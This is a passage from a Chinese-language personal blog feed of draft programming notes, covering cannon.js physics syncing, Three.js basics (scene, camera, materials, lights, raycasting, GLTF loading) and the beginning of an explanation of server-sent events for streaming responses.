class="number">0</span>), <span class="built_in">Math</span>.PI * <span class="number">0.5</span>) </span><br><span class="line">world.addBody(floorBody)</span><br></pre></td></tr></table></figure><h3 id="4-更新物理世界"><a href="#4-更新物理世界" class="headerlink" title="4. 更新物理世界"></a>4. 更新物理世界</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> clock = <span class="keyword">new</span> THREE.Clock()</span><br><span class="line"><span class="keyword">let</span> oldElapsedTime = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> elapsedTime = clock.getElapsedTime()</span><br><span class="line">  <span class="keyword">const</span> deltaTime = elapsedTime - oldElapsedTime</span><br><span class="line">  oldElapsedTime = elapsedTime</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update physics</span></span><br><span class="line">  world.step(<span class="number">1</span> / <span class="number">60</span>, deltaTime, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将cannon.js物体与three.js物体关联起来</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> object <span class="keyword">of</span> objectsToUpdate) &#123;</span><br><span class="line">    object.mesh.position.copy(object.body.position)</span><br><span class="line">    object.mesh.quaternion.copy(object.body.quaternion)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Render</span></span><br><span class="line">  renderer.render(scene, camera)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Call tick again on the next frame</span></span><br><span class="line">  <span class="built_in">window</span>.requestAnimationFrame(tick)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tick()</span><br></pre></td></tr></table></figure><h3 id="5-移除物体"><a href="#5-移除物体" class="headerlink" title="5. 移除物体"></a>5. 移除物体</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> object <span class="keyword">of</span> objectsToUpdate) &#123;</span><br><span class="line">  world.removeBody(object.body)</span><br><span class="line">  scene.remove(object.mesh)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">objectsToUpdate.splice(<span class="number">0</span>, objectsToUpdate.length)</span><br></pre></td></tr></table></figure><p>-</p>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Threejs基本概念</title>
      <link href="/2024/12/02/threejs/"/>
      <url>/2024/12/02/threejs/</url>
      <content type="html"><![CDATA[<h3 id="1-基本组成"><a href="#1-基本组成" class="headerlink" title="1. 基本组成"></a>1. 基本组成</h3><h4 id="1-1-场景-Scene"><a href="#1-1-场景-Scene" class="headerlink" title="1.1 场景 Scene"></a>1.1 场景 Scene</h4><ul><li><em><code>new Three.Scene()</code></em> 新建场景</li><li><em><code>add(objects)</code></em> 添加物体(包括点point、线line、面triangle、体-由多个面组成)</li><li><em><code>add(light)</code></em> 添加灯光</li></ul><p><br></p><h4 id="1-2-照相机-Camera"><a href="#1-2-照相机-Camera" class="headerlink" title="1.2 照相机 Camera"></a>1.2 照相机 Camera</h4><ul><li><em><code>new Three.PerspectiveCamera(视野角度, 长宽比, 近截面, 远截面)</code></em> 新建透视摄像机</li><li><em><code>lookAt(mesh.position)</code></em> 设置相机指向</li><li><em><code>updateProjectionMatrix()</code></em> 修改相机的视野角度, 长宽比, 近截面, 远截面后，需要调用这个方法重新计算投影矩阵</li></ul><p><br></p><h4 id="1-3-渲染器-Renderer"><a href="#1-3-渲染器-Renderer" class="headerlink" title="1.3 渲染器 Renderer"></a>1.3 渲染器 Renderer</h4><p>照相机将场景中的物体投影在渲染器上，画面显示在<code>canvas</code>画布上，<code>canvas</code>挂载在<code>renderer.domElement</code>这一div上。</p><ul><li>new Three.WebGLRenderer()</li><li>setSize</li><li>setPixelRatio</li><li>render(scene, camera)</li><li>shadowMap.enabled</li><li>shadowMap.type</li><li>antialias: true 抗锯齿</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> THREE <span class="keyword">from</span> <span class="string">'three'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> scene = <span class="keyword">new</span> THREE.Scene();</span><br><span class="line"><span class="keyword">const</span> camera = <span class="keyword">new</span> THREE.PerspectiveCamera( <span class="number">75</span>, <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight, <span class="number">0.1</span>, <span class="number">1000</span> );</span><br><span class="line"><span class="keyword">const</span> renderer = <span class="keyword">new</span> THREE.WebGLRenderer();</span><br><span class="line">renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line">renderer.render(scene, camera);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(renderer.domElement);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-物体"><a href="#2-物体" class="headerlink" title="2. 物体"></a>2. 物体</h3><h4 id="2-1-网格-Mesh"><a href="#2-1-网格-Mesh" class="headerlink" title="2.1 网格 Mesh"></a>2.1 网格 Mesh</h4><p><code>Mesh</code>表示场景中的点线面体，这些物体都是由<code>geometry</code>几何体和<code>material</code>材质组成。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建mesh</span></span><br><span class="line"><span class="keyword">const</span> geometry = <span class="keyword">new</span> THREE.BoxGeometry( <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span> );</span><br><span class="line"><span class="keyword">const</span> material = <span class="keyword">new</span> THREE.MeshBasicMaterial( &#123; <span class="attr">color</span>: <span class="number">0x00ff00</span> &#125; );</span><br><span class="line"><span class="keyword">const</span> mesh = <span class="keyword">new</span> THREE.Mesh( geometry, material );</span><br><span class="line">scene.add(mesh);</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h4 id="2-2-材料-Material"><a href="#2-2-材料-Material" class="headerlink" title="2.2 材料 Material"></a>2.2 材料 Material</h4><ul><li>new MeshBasicMaterial({ color, wireframe, map })<ul><li>color: 材质颜色</li><li>wireframe: 将材质渲染为线框</li><li>map: 使用贴图</li></ul></li></ul><p>其他材质：</p><ul><li><code>MeshPhysicalMaterial</code>物理网络材质</li><li><code>MeshMatcapMaterial</code>适用于光照场景</li><li><code>MeshStandardMaterial</code>: <ul><li>roughness: 材质的粗糙程度，0表示平滑的镜面反射，1表示完全漫反射</li><li>metalness:</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 图片贴图：textureLoader</span></span><br><span class="line"><span class="keyword">const</span> alphaTexture = textureLoader.load(<span class="string">'/textures/door/alpha.jpg'</span>)</span><br><span class="line"><span class="keyword">const</span> material = <span class="keyword">new</span> THREE.MeshBasicMaterial(&#123; <span class="attr">map</span>: alphaTexture &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 环境贴图： RGBELoader</span></span><br><span class="line"><span class="keyword">import</span> &#123; RGBELoader &#125; <span class="keyword">from</span> <span class="string">'three/examples/jsm/loaders/RGBELoader.js'</span></span><br><span class="line"><span class="keyword">const</span> rgbeLoader = <span class="keyword">new</span> RGBELoader()</span><br><span class="line">rgbeLoader.load(<span class="string">'./textures/environmentMap/2k.hdr'</span>, (environmentMap) =&gt; &#123;</span><br><span class="line">  environmentMap.mapping = THREE.EquirectangularReflectionMapping</span><br><span class="line">  scene.background = environmentMap</span><br><span class="line">  scene.environment = environmentMap</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 艺术字</span></span><br><span class="line"><span class="keyword">import</span> &#123; FontLoader &#125; <span class="keyword">from</span> <span class="string">'three/examples/jsm/loaders/FontLoader.js'</span></span><br><span class="line"><span class="keyword">import</span> &#123; TextGeometry &#125; <span class="keyword">from</span> <span class="string">'three/examples/jsm/geometries/TextGeometry.js'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> textureLoader = <span class="keyword">new</span> THREE.TextureLoader()</span><br><span class="line"><span class="keyword">const</span> matcapTexture = textureLoader.load(<span class="string">'textures/matcaps/8.png'</span>)</span><br><span class="line">matcapTexture.colorSpace = THREE.SRGBColorSpace</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fontLoader = <span class="keyword">new</span> FontLoader()</span><br><span class="line">fontLoader.load(<span class="string">'/fonts/helvetiker_regular.typeface.json'</span>, font =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> material = <span class="keyword">new</span> THREE.MeshMatcapMaterial(&#123; <span class="attr">matcap</span>: matcapTexture &#125;)</span><br><span class="line">  <span class="keyword">const</span> textGeometry = <span class="keyword">new</span> TextGeometry(<span class="string">'hello world'</span>, &#123;</span><br><span class="line">    font,</span><br><span class="line">    size: <span class="number">0.5</span>,</span><br><span class="line">    height: <span class="number">0.2</span></span><br><span class="line">  &#125;)</span><br><span class="line">  textGeometry.center()</span><br><span class="line">  <span class="keyword">const</span> text = <span class="keyword">new</span> THREE.Mesh(textGeometry, material)</span><br><span class="line">  scene.add(text)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-几何体-Geometry"><a href="#2-3-几何体-Geometry" class="headerlink" title="2.3 几何体 Geometry"></a>2.3 几何体 Geometry</h4><ul><li>BoxGeometry</li><li>BufferGeometry</li><li>PlaneGeometry<br>将信息（例如顶点位置，面索引，法线，颜色，uv和任何自定义属性）存储在buffers（Float32Array, BufferAttribute）中。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个矩形. 在这里我们左上和右下顶点被复制了两次。</span></span><br><span class="line"><span class="comment">// 因为在两个三角面片里，这两个顶点都需要被用到。</span></span><br><span class="line"><span class="keyword">const</span> geometry = <span class="keyword">new</span> THREE.BufferGeometry();</span><br><span class="line"><span class="keyword">const</span> vertices = <span class="keyword">new</span> <span class="built_in">Float32Array</span>( [</span><br><span class="line">  <span class="number">-1.0</span>, <span class="number">-1.0</span>,  <span class="number">1.0</span>,</span><br><span class="line">  <span class="number">1.0</span>, <span class="number">-1.0</span>,  <span class="number">1.0</span>,</span><br><span class="line">  <span class="number">1.0</span>,  <span class="number">1.0</span>,  <span class="number">1.0</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">1.0</span>,  <span class="number">1.0</span>,  <span class="number">1.0</span>,</span><br><span class="line">  <span class="number">-1.0</span>,  <span class="number">1.0</span>,  <span class="number">1.0</span>,</span><br><span class="line">  <span class="number">-1.0</span>, <span class="number">-1.0</span>,  <span class="number">1.0</span></span><br><span class="line">] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// itemSize = 3 因为每个顶点都是一个三元组。</span></span><br><span class="line">geometry.setAttribute( <span class="string">'position'</span>, <span class="keyword">new</span> THREE.BufferAttribute( vertices, <span class="number">3</span> ) );</span><br><span class="line"><span class="keyword">const</span> material = <span class="keyword">new</span> THREE.MeshBasicMaterial( &#123; <span class="attr">color</span>: <span class="number">0xff0000</span> &#125; );</span><br><span class="line"><span class="keyword">const</span> mesh = <span class="keyword">new</span> THREE.Mesh( geometry, material );</span><br></pre></td></tr></table></figure><p>几何体的属性和方法</p><ul><li>attributes 几何体相应的buffer</li><li>position 设置位置</li><li>scale 缩放</li><li>rotation 旋转</li><li>translate 移动</li><li>lookAt 设置朝向</li></ul><h4 id="2-4-变换-transform"><a href="#2-4-变换-transform" class="headerlink" title="2.4 变换 transform"></a>2.4 变换 transform</h4><p>变化mesh的属性，坐标轴<code>AxesHelp()</code>辅助实现</p><ul><li>position 位置</li><li>rotation 旋转</li><li>scale 缩放</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mesh.scale.set(radius, radius, radius)</span><br><span class="line">mesh.rotation.x = <span class="number">1</span></span><br><span class="line">mesh.position.x = <span class="number">1</span></span><br><span class="line">mesh.position.copy(mesh2.position)</span><br></pre></td></tr></table></figure><h4 id="2-5-组合-Group"><a href="#2-5-组合-Group" class="headerlink" title="2.5 组合 Group"></a>2.5 组合 Group</h4><p>将多个物体放入一个组合中做旋转，会以组合中心整体旋转。一个物体可以放进多个<code>Group</code>中（可以做太阳系效果）</p><p><br></p><h3 id="3-光"><a href="#3-光" class="headerlink" title="3. 光"></a>3. 光</h3><p>灯光和材质紧密相关。</p><h4 id="3-1-光线-Light"><a href="#3-1-光线-Light" class="headerlink" title="3.1 光线 Light"></a>3.1 光线 Light</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AmbientLight 环境光，均匀的照亮场景中的所有物体</span></span><br><span class="line"><span class="keyword">const</span> ambientLight = <span class="keyword">new</span> THREE.AmbientLight(<span class="number">0xffffff</span>, <span class="number">1.5</span>)</span><br><span class="line">scene.add(ambientLight)</span><br><span class="line"></span><br><span class="line"><span class="comment">// PointLight 点光源，从一个点向各个方向发射的光源</span></span><br><span class="line"><span class="keyword">const</span> pointLight = <span class="keyword">new</span> THREE.PointLight(<span class="number">0xffffff</span>, <span class="number">50</span>)</span><br><span class="line">pointLight.position.x = <span class="number">2</span></span><br><span class="line">pointLight.position.y = <span class="number">3</span></span><br><span class="line">pointLight.position.z = <span class="number">4</span></span><br><span class="line">scene.add(pointLight)</span><br><span class="line"></span><br><span class="line"><span class="comment">// DirectionLight 平行光，模拟太阳光</span></span><br><span class="line"><span class="keyword">const</span> directionalLight = <span class="keyword">new</span> THREE.DirectionalLight(<span class="number">0xffffff</span>, <span class="number">1.5</span>)</span><br><span class="line">directionalLight.position.set(<span class="number">2</span>, <span class="number">2</span>, - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="3-2-阴影-Shadow"><a href="#3-2-阴影-Shadow" class="headerlink" title="3.2 阴影 Shadow"></a>3.2 阴影 Shadow</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开启Renderer的阴影效果</span></span><br><span class="line">renderer.shadowMap.enabled = <span class="literal">false</span></span><br><span class="line">renderer.shadowMap.type = THREE.PCFSoftShadowMap</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义mesh / light是否投射阴影，是否接收阴影</span></span><br><span class="line">pointLight.castShadow = <span class="literal">true</span></span><br><span class="line">mesh.receiveShadow = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置shadow的属性</span></span><br><span class="line">mesh.shadow.mapSize.width = <span class="number">256</span> <span class="comment">// 阴影贴图的宽度</span></span><br><span class="line">mesh.shadow.mapSize.height = <span class="number">256</span> <span class="comment">// 阴影贴图的高度</span></span><br><span class="line">mesh.shadow.camera.far = <span class="number">7</span></span><br></pre></td></tr></table></figure><p><br> </p><h3 id="4-运动"><a href="#4-运动" class="headerlink" title="4. 运动"></a>4. 运动</h3><h4 id="4-1-计时器-Clock"><a href="#4-1-计时器-Clock" class="headerlink" title="4.1 计时器 Clock"></a>4.1 计时器 Clock</h4><p><code>Clock</code> 用于跟踪时间</p><ul><li>new THREE.Clock()</li><li>clock.getElapsedTime() 获取时钟运行的总时长</li><li>clock.start() 启动时钟</li><li>clock.stop() 停止时钟</li><li>clock.getDelta() 获取<code>.oldTime</code>设置后到当前的秒数</li><li>clock.oldTime 存储最后一次调用<code>start</code>, <code>getElapsedTime</code>, <code>getDelta</code>的时间</li></ul><p>使用<code>requestAnimationFrame</code>, <code>Three.Clock</code>, <code>getElapsedTime</code>改变物体的position实现动画循环。<br>如下面代码所示，动画的更新应该依赖<code>elapsedTime</code>, 而不是单纯的叠加，<em>来解决不同设备刷新率不同的问题</em>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> clock = <span class="keyword">new</span> THREE.Clock()</span><br><span class="line"><span class="keyword">const</span> tick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> elapsedTime = clock.getElapsedTime()</span><br><span class="line">  mesh.rotation.y = elapsedTime; <span class="comment">// right</span></span><br><span class="line">  mesh.rotation.y += <span class="number">1</span> <span class="comment">// wrong</span></span><br><span class="line">  renderer.render(scene, camera)</span><br><span class="line">  <span class="built_in">window</span>.requestAnimationFrame(tick)</span><br><span class="line">&#125;</span><br><span class="line">tick()</span><br></pre></td></tr></table></figure><h4 id="4-2-帧率检测-Stat"><a href="#4-2-帧率检测-Stat" class="headerlink" title="4.2 帧率检测 Stat"></a>4.2 帧率检测 Stat</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Stat <span class="keyword">from</span> <span class="string">'three/examples/jsm/libs/stats.module'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> stat = <span class="keyword">new</span> Stat()</span><br><span class="line"><span class="built_in">document</span>.body.append(stat.dom)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  stat.update()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-鼠标交互"><a href="#5-鼠标交互" class="headerlink" title="5. 鼠标交互"></a>5. 鼠标交互</h3><h4 id="5-1-交互-OrbitControls"><a href="#5-1-交互-OrbitControls" class="headerlink" title="5.1 交互 OrbitControls"></a>5.1 交互 OrbitControls</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> controls = <span class="keyword">new</span> OrbitControls(camera, canvas)</span><br><span class="line">controls.enableDamping = <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="5-2-鼠标拾取-Raycaster"><a href="#5-2-鼠标拾取-Raycaster" class="headerlink" title="5.2 鼠标拾取 Raycaster"></a>5.2 鼠标拾取 Raycaster</h4><p><code>Raycaster</code>光线投射，通过在场景中发射一条从相机出发并穿过鼠标点击位置的射线，我们可以检测到射线与哪些对象相交，从而实现用户与3D对象的交互。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> raycaster = <span class="keyword">new</span> THREE.Raycaster();</span><br><span class="line"><span class="keyword">const</span> mouse = <span class="keyword">new</span> THREE.Vector2();</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onMouseClick</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 将鼠标位置转换为归一化设备坐标(NDC)</span></span><br><span class="line">  mouse.x = (event.clientX / <span class="built_in">window</span>.innerWidth) * <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line">  mouse.y = - (event.clientY / <span class="built_in">window</span>.innerHeight) * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 通过相机和鼠标位置更新射线</span></span><br><span class="line">  raycaster.setFromCamera(mouse, camera);</span><br><span class="line">  <span class="comment">// 计算物体和射线的交点</span></span><br><span class="line">  <span class="keyword">const</span> intersects = raycaster.intersectObjects(scene.children);</span><br><span class="line">  <span class="keyword">if</span> (intersects.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果有交点，更改第一个交点物体的颜色</span></span><br><span class="line">    intersects[<span class="number">0</span>].object.material.color.set(<span class="number">0xff0000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'click'</span>, onMouseClick);</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'mousemove'</span>, onMouseClick);</span><br></pre></td></tr></table></figure></p><h3 id="5-其他"><a href="#5-其他" class="headerlink" title="5. 其他"></a>5. 其他</h3><h4 id="4-3-窗口事件"><a href="#4-3-窗口事件" class="headerlink" title="4.3 窗口事件"></a>4.3 窗口事件</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, () =&gt;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Update sizes</span></span><br><span class="line">  sizes.width = <span class="built_in">window</span>.innerWidth</span><br><span class="line">  sizes.height = <span class="built_in">window</span>.innerHeight</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update camera</span></span><br><span class="line">  camera.aspect = sizes.width / sizes.height</span><br><span class="line">  camera.updateProjectionMatrix()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update renderer</span></span><br><span class="line">  renderer.setSize(sizes.width, sizes.height)</span><br><span class="line">  renderer.setPixelRatio(<span class="built_in">Math</span>.min(<span class="built_in">window</span>.devicePixelRatio, <span class="number">2</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="4-4-调试工具-debug-ui"><a href="#4-4-调试工具-debug-ui" class="headerlink" title="4.4 调试工具 debug ui"></a>4.4 调试工具 debug ui</h4><p>使用<code>lil-gui</code>包<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> GUI <span class="keyword">from</span> <span class="string">'lil-gui'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> gui = <span class="keyword">new</span> GUI()</span><br></pre></td></tr></table></figure></p><h4 id="4-5-加载blender-model"><a href="#4-5-加载blender-model" class="headerlink" title="4.5 加载blender model"></a>4.5 加载blender model</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; GLTFLoader &#125; <span class="keyword">from</span> <span class="string">'three/examples/jsm/loaders/GLTFLoader.js'</span></span><br><span class="line"><span class="keyword">import</span> &#123; DRACOLoader &#125; <span class="keyword">from</span> <span class="string">'three/examples/jsm/loaders/DRACOLoader.js'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dracoLoader = <span class="keyword">new</span> DRACOLoader()</span><br><span class="line">dracoLoader.setDecoderPath(<span class="string">'/draco/'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> gltfLoader = <span class="keyword">new</span> GLTFLoader()</span><br><span class="line">gltfLoader.setDRACOLoader(dracoLoader)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mixer = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">gltfLoader.load(<span class="string">'/models/Fox/glTF/Fox.gltf'</span>, (gltf) =&gt; &#123;</span><br><span class="line">  gltf.scene.scale.set(<span class="number">0.025</span>, <span class="number">0.025</span>, <span class="number">0.025</span>)</span><br><span class="line">  scene.add(gltf.scene)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Animation</span></span><br><span class="line">  mixer = <span class="keyword">new</span> THREE.AnimationMixer(gltf.scene)</span><br><span class="line">  <span class="keyword">const</span> action = mixer.clipAction(gltf.animations[<span class="number">2</span>])</span><br><span class="line">  action.play()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="其他常见画面"><a href="#其他常见画面" class="headerlink" title="其他常见画面"></a>其他常见画面</h3><ul><li>particles 粒子， 17-particles-final</li><li>galaxy 星系, 18-galaxy-generator-final</li><li>scroll 滚动效果 19-scroll-based-animation-final</li><li><em>Axes-helper 坐标辅助线</em></li></ul><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="">B站 Three.js Jounery</a></li><li><a href="">B站 进华 three.js教程-从入门到入门</a></li></ul>]]></content>
      
      <categories>
          
          <category> 草稿 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>流式渲染 SSE</title>
      <link href="/2024/11/06/%E6%B5%81%E5%BC%8F%E6%B8%B2%E6%9F%93/"/>
      <url>/2024/11/06/%E6%B5%81%E5%BC%8F%E6%B8%B2%E6%9F%93/</url>
      <content type="html"><![CDATA[<blockquote><p>请求chatgpt接口，会有一个<code>stream: boolean</code>的参数，表示接口支持流式渲染。如何实现流式渲染呢？</p></blockquote><p><code>EventSource</code>接口是 web 内容与服务器发送事件通信的接口。<br>一个 EventSource 实例会对 HTTP 服务器开启一个持久化的连接，以 <code>text/event-stream</code> 格式发送事件，此连接会一直保持开启直到通过调用 <code>EventSource.close() 关闭。</code></p><p>请求type为<code>eventsource</code>(不是普通的xhr)，控制台里点击请求，会有一个EventStream事件流，它会一点点把消息推送给前端。</p><ul><li>前端：使用eventsource API发请求</li><li>后端Content-Type: text/event-stream</li><li>消息格式: “data: xxx\n\n”</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evtSource = <span class="keyword">new</span> EventSource(<span class="string">"sse.php"</span>);</span><br><span class="line"></span><br><span class="line">evtSource.onmessage = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>前端npm包：@microsoft/fetch-event-source<figure class="highlight js"><table><tr><td 